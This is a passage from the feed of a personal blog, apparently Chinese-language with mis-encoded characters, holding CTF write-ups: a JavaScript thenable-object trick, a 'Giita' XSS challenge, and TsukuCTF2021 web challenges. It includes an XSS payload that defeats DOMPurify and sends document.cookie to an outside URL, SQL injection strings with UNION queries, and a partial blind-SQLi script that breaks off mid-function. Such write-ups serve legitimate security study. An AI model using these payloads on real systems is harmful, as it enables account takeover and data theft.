&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span> &lt;span style="color:#75715e">// here is salt
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êàë‰ª¨ÊÉ≥ÂõûÂ§çÂà∞routeÂè™Êúâ‰∏Ä‰∏™flagÂπ∂‰∏îÂèØËææÁöÑÁä∂ÊÄÅÔºå‰ΩÜÊòØÂèà‰∏çÊÉ≥Âà†Èô§Êéâ&lt;code>salt: 'flag'&lt;/code>&lt;/p>
&lt;p>ÂÖ≥ÈîÆ‰πãÂ§ÑÂú®‰∫é&lt;code>set_salt&lt;/code>ÔºåÂÆÉÊÉ≥ÂÆåÊàêÁöÑ‰ªªÂä°ÊòØ‰∏ÄËµ∑Êõ¥Êñ∞routesÂíåsaltÁöÑÂÄº&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Á¨¨‰∫åË°å‰∏≠ÔºåÊàë‰ª¨Ë¶Å&lt;code>await setRoutes&lt;/code>ÔºåÁõ∏ÂΩì‰∫é&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">set_salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">salt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøôÈáå‰ºöË¶ÅÂà∞‰∏Ä‰∏™setRoutesÁöÑËøîÂõûÂÄºresult&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">setRoutes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">// redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂæàÊ≤°ÂøÖË¶ÅÁöÑÊìç‰ΩúÔºåÂèà‰∏ÄÈÅçsetRoutesÔºåÁ∫ØÂ±ûËÑ±Ë£§Â≠êÊîæÂ±Å&lt;/p>
&lt;p>ÂΩìÊàë‰ª¨ËÆæÁΩÆ&lt;code>salt = 'then'&lt;/code>Êó∂ÔºåÊÉÖÂÜµÂ∞±‰∏ç‰∏ÄÊ†∑‰∫Ü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75715e">//redacted
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ëøô‰∏™ÁâπÊÆäÁöÑthenÂÖ≥ÈîÆÂ≠ó‰∏ÄÂá∫Êù•ÔºåÂ∞±ÂæàÁâπÊÆäÔºåËß£ÈáäÂô®‰ºöËØïÂõæÊääÂÆÉËÆ§‰ΩúÊòØawait‰∏≠Ë¶ÅË∞ÉÁî®ÁöÑthenÁöÑÈÉ®ÂàÜÔºå‰ΩÜÊòØÂπ∂Ê≤°ÊúâawaitÈúÄË¶ÅÂÆÉËøô‰∏™thenÊâßË°åÁöÑresultÊù•‰Ωú‰∏∫ËøîÂõûÂÄºÔºåÂ∞±Âç°Ê≠ªÂú®ËøôÈáå‰∫ÜÔºåËøô‰∏™saltÊó†Â§ÑÂèØÂéª&lt;/p>
&lt;p>SoÔºå&lt;code>GET /?action=SetSalt&amp;amp;data=then&lt;/code>‰πãÂêésessionÂ∞ÜÊòØËøôÊ†∑ÁöÑ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">...&lt;/span>
&lt;span style="color:#75af00">then&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">...,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">salt&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Âè™Ë¶Å&lt;code>GET /?action=GetSalt&lt;/code>Âç≥ÂèØÔºåÂõ†‰∏∫&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">routes&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">route&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// route = session.salt here (just flag)
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂÖ∑‰ΩìÊìç‰Ωú‰∏ÄÂº†Âä®ÂõæÂ∞±ËÉΩËØ¥Ê∏ÖÊ•ö&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8q7R2If.gif" alt="img">&lt;/p>
&lt;p>ÊúÄÂêéÔºåËøô‰∏™**ÁöÑ‰∏úË•øÂ≠¶ÂêçÂè´&lt;a href="https://masteringjs.io/tutorials/fundamentals/thenable">Thenable Object&lt;/a>ÔºåË∞¢Ë∞¢‰Ω†ÔºåjavascriptüòÖ&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://hackmd.io/@hakatashi/ryRg7oLEt">wp&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004090604105.png" alt="image-20211004090604105">&lt;/p>
&lt;h2 id="webgiita">Web/Giita&lt;/h2>
&lt;blockquote>
&lt;p>Gibson Les Paul Standard.&lt;/p>
&lt;p>Steal Cookie.&lt;/p>
&lt;/blockquote>
&lt;p>üò≠üò≠üò≠ÂèàÊòØcookie&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004082810346.png" alt="image-20211004082810346">&lt;/p>
&lt;p>ÁúãÊ∫êÁ†ÅÔºåapp.js&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161650511.png" alt="image-20211004161650511">&lt;/p>
&lt;p>11Ë°åÁöÑÊ≠£ÂàôÂåπÈÖç‰∫ÜÁ©∫Ê†º„ÄÅÂ≠óÊØç„ÄÅÊï∞Â≠ó„ÄÅ‰∏ãÂàíÁ∫øÔºå‰ΩÜÊòØÂ§ö‰Ωô‰∫Ü‰∏Ä‰∏™&lt;code>.&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004161816780.png" alt="image-20211004161816780">&lt;/p>
&lt;p>‰ºöÊääthemeÊîæËøõÂéªËøõË°å‰∏Ä‰∏™ËøáÊª§&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004162229240.png" alt="image-20211004162229240">&lt;/p>
&lt;p>ÁÑ∂ÂêéÊãºÊé•Âà∞stylesheet link‰∏≠ÔºåÂ∞±ÂÜçÊ≤°Êúâ‰ªÄ‰πàËøáÊª§‰∫Ü&lt;/p>
&lt;p>Êàë‰ª¨ÂèØ‰ª•Ê≥®ÂÖ•Âà∞hrefËøôÈáåÔºåÊØîÂ¶Ç&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!-- theme=x%20onerror%3Dalert --&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">link&lt;/span> &lt;span style="color:#75af00">rel&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;stylesheet&amp;#34;&lt;/span> &lt;span style="color:#75af00">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">x&lt;/span> &lt;span style="color:#75af00">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">alert&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ë¶ÅÂÆåÊï¥ÁöÑÊ≥®ÂÖ•js‰ª£Á†ÅÔºåÊàë‰ª¨ÈúÄË¶Åcheat DOMPurify&lt;/p>
&lt;p>DOMPurify‰ºöÂÖà&lt;a href="https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L156-L160">Ê£ÄÊµãÂØπË±°&lt;/a>Âú®‰∏çÂú®&lt;code>DOMPurify.isSupported&lt;/code>ÁöÑËåÉÂõ¥ÂÜÖ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004163456492.png" alt="image-20211004163456492">&lt;/p>
&lt;p>ÊâÄ‰ª•Âë¢ÔºåÊàë‰ª¨ÊääÂÆÉÁªôÂÖ≥ÂíØ&lt;/p>
&lt;pre tabindex="0">&lt;code>delete document.implementation.__proto__.createHTMLDocument
&lt;/code>&lt;/pre>&lt;p>ÊúÄÂêéÁöÑPayloadÔºåU+00A0(NBSP)‰∏çÂú®htmlÁöÑÁ©∫ÁôΩÁ¨¶‰∏≠Ôºå‰ΩÜÊòØÂú®JavascriptÁöÑÁ©∫ÁôΩÁ¨¶‰∏≠&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#75af00">axios&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">method&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`http://&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">/`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;content-type&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">},&lt;/span>
&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">qs&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">theme&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x onerror=delete\xA0document.implemenation__proto__.createHTMLDocument&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">title&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;x&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">`&amp;lt;img src=&amp;#34;x&amp;#34; onerror=&amp;#34;location.href&amp;#34;=&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">?&amp;#39; + document.cookie&amp;gt;`&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">}),&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂÆåÊï¥ÂèÇËßÅ-&amp;gt;&lt;a href="https://hackmd.io/@hakatashi/HkgG02U4t">wp&lt;/a>&lt;/p>
&lt;hr>
&lt;p>Â∞±ÊòØËèú ‰∏ç‰ºöÂÅö ÂãâÂº∫ÁúãÁúãwp Ëøò‰∏ç‰∏ÄÂÆöÁúãÂæóÊáÇ&lt;/p>
&lt;p>ÈìÅÂ∫üÁâ©‰∫ÜüòÖ&lt;/p></description></item><item><title>TsukuCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</link><pubDate>Mon, 13 Sep 2021 19:15:21 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/</guid><description>&lt;p>Ëøô‰∏§Â§©ÂèàÂºÄÂßãÊúâÁÇπÊëÜÁÉÇÁöÑËøπË±°Ôºå‰∫éÊòØÊääÂë®Êú´ÁöÑctfÁúãÁúãwpÔºåÊ∞¥‰∏ÄÊ∞¥ÔºåÂ§çÁé∞‰∏Ä‰∏ã&lt;/p>
&lt;p>Âè¶Â§ñËøô‰∏™ctfÊúÄÁóõËã¶ÁöÑÂú∞ÊñπÂú®‰∫éÊòØËã±Êó•Â§πÊùÇÔºåÊàëÂºÄÂßãÊáÇÊ≠™Êûú‰ªÅÂÅö‰∏≠ÊñáÊØîËµõÈ°µÈù¢ÁöÑÊó∂ÂÄôÊúâÂ§öÁóõËã¶‰∫Ü&lt;/p>
&lt;h2 id="weblogonly">Web/logonly&lt;/h2>
&lt;p>ÁªôÂá∫ÁöÑÊòØ‰∏Ä‰∏™Êúâ214155Ë°åÁöÑÊó•ÂøóÊñá‰ª∂ÔºåÂè™ÊúâÁ¨¨214154Ë°åËøîÂõû200ok&lt;/p>
&lt;p>ÊòæÁÑ∂ÊòØËøõË°å‰∫Ü‰∏Ä‰∏™Â≠óÂÖ∏ÊîªÂáªÔºåÂú®Á¨¨214154Ê¨°Â∞ùËØïÊó∂ÊíûÂØπ‰∫ÜÔºåÊàë‰ª¨‰∏ãËΩΩ‰∏Ä‰ªΩkaliÈáåÁöÑrockyou.txt‰∏≠Áúã‰∏Ä‰∏ã214154ÊòØ‰∏™Âï•ÔºàÊúâÊèêÁ§∫Áî®Âà∞kaliËøõË°åÊîªÂáªÔºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912171725965.png" alt="image-20210912171725965">&lt;/p>
&lt;p>&lt;code>TsukuCTF{qwertyuiop[]\\}&lt;/code>&lt;/p>
&lt;h2 id="webdigits">Web/digits&lt;/h2>
&lt;p>‰∏Ä‰∏™fastapiÁ´ôÔºå‰ΩÜÊòØË¶ÅÊ±Ç‰∏çÊòØÂæàÈ´òÁöÑÊ†∑Â≠ê&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174109098.png" alt="image-20210912174109098">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912174032687.png" alt="image-20210912174032687">&lt;/p>
&lt;p>Âä†Âè∑ÊîæÂà∞url‰∏≠Áõ∏ÂΩì‰∫éÂçäËßíÁ©∫Ê†º&lt;/p>
&lt;p>&lt;code>TsukuCTF{you_are_lucky_Tsukushi}&lt;/code>&lt;/p>
&lt;h2 id="weblogin">Web/login&lt;/h2>
&lt;p>ÁôªÂΩïÊ°ÜÔºå‰∏áËÉΩÂØÜÁ†Å&lt;code>admin'or 1#&lt;/code>&lt;/p>
&lt;p>&lt;code>TsukuCTF{You_4r3_SUP3R_H4CKER}&lt;/code>&lt;/p>
&lt;p>‰∏ÄËà¨ËøôÁßçÁÆÄÂçïÁöÑÁôªÂΩïÈÉΩÊòØ‰∏áËÉΩÂØÜÁ†ÅÔºå‰ΩÜÊòØ‰πüÂæóÂ§öËØï‰∏ÄËØïÔºåÂä†‰∏™Ê≥®ÈáäÁ¨¶Âïä ÂàÜÂè∑‰ªÄ‰πàÁöÑ&lt;/p>
&lt;h2 id="weblogin2">Web/login2&lt;/h2>
&lt;p>ËØ¥ÊòØ‰ª£Á†ÅÈáçÊûÑËøá‰∫Ü&lt;/p>
&lt;p>ÂÜçÁî®‰∏äÈù¢ÁöÑ‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•‰ºöÊòæÁ§∫Ëøô‰∏™Á´ôÁöÑÊâÄÊúâË¥¶Âè∑&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210912175523340.png" alt="image-20210912175523340">&lt;/p>
&lt;p>ËØ¥ÊòéËøòÊòØÊúâsqliÔºåÂ∞ùËØï‰∏Ä‰∏ãËÅîÂêàÊ≥®ÂÖ•&lt;code>admin'or 1 union select null,null#&lt;/code>ÔºåË∑ü‰∏äÈù¢ÊòØ‰∏ÄÊ†∑ÁöÑÂõûÊòæÔºåËØ¥ÊòéÊúâ‰∏§ÂàóÔºåÁÑ∂ÂêéÊòØÊÑâÂø´ÁöÑÊ≥®ÂÖ•ÔºàÊØè‰∏ÄÊ¨°ÁöÑÂõûÊòæÂú®È°µÈù¢ÁöÑÊú´Â∞æÔºåÊ≥®ÊÑèËøô‰∏™ÊòØÊúÄÂàùË¶ÅÊâæÂà∞Âπ∂Á°ÆËÆ§ÁöÑÔºâ&lt;/p>
&lt;pre tabindex="0">&lt;code>admin'or 1 union select table_name,null from information_schema.columns#
admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'#
admin'or 1 union select secret,null from super_secret_table#
&lt;/code>&lt;/pre>&lt;p>&lt;code>TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}&lt;/code>&lt;/p>
&lt;h2 id="weblogin3">Web/login3&lt;/h2>
&lt;p>‰æùÁÑ∂ÊòØÂ≠òÂú®sqliÔºåÁî®‰∏äÈù¢ÁöÑ‰∏§‰∏™payloadÈÉΩËÉΩÂõûÊòæÊ≠£Â∏∏Ôºå‰ΩÜÊòØÊ≤°ÊúâÊòéÁ°ÆÁöÑ‰ø°ÊÅØÔºåÂ∫îËØ•ÊòØÈúÄË¶ÅÁõ≤Ê≥®‰∫Ü&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery_core&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#39;or ascii(substring((&lt;/span>&lt;span style="color:#d88200">{0}&lt;/span>&lt;span style="color:#d88200">),&lt;/span>&lt;span style="color:#d88200">{1}&lt;/span>&lt;span style="color:#d88200">,1))&amp;gt;=&lt;/span>&lt;span style="color:#d88200">{2}&lt;/span>&lt;span style="color:#d88200">;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">mid&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;a&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;„Çà„ÅÜ„Åì„Åù&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">page&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_execAnyQuery&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pos&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#111">low&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">mid&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">high&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">low&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
